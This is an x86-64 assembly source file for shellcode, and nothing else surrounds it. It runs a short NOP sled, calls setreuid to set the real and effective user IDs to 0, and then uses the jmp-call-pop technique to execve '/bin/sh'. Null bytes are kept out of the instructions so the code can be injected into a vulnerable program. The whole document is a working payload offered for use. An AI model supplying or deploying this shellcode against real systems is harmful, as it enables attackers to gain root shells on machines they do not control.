BITS 64
GLOBAL _start
 
SECTION .data                  ; needs to be writable and executable for testing
_start:
    ; setreuid(ruid, euid)
    NOP
    NOP
    NOP
    NOP
    NOP
    xor rax, rax
    add rax, 113           ; 113 = setreuid
    xor rdi, rdi           ; real userid
    xor rsi, rsi           ; effective userid
    syscall
 
    jmp get_address        ; get the address of our string
 
run:
    ; execve(char *filename, char *argv[], char *envp[])
    xor rax, rax
    add rax, 59            ; 59 = execve
    pop rdi                ; pop string address
    mov [rdi+7], byte ah   ; put a null byte after /bin/sh (replace N)
    xor rsi, rsi           ; char *argv[] = null
    xor rdx, rdx           ; char *envp[] = null
    syscall
 
get_address:
    call run               ; push the address of the string onto the stack
 
shell:
    db '/bin/shN'
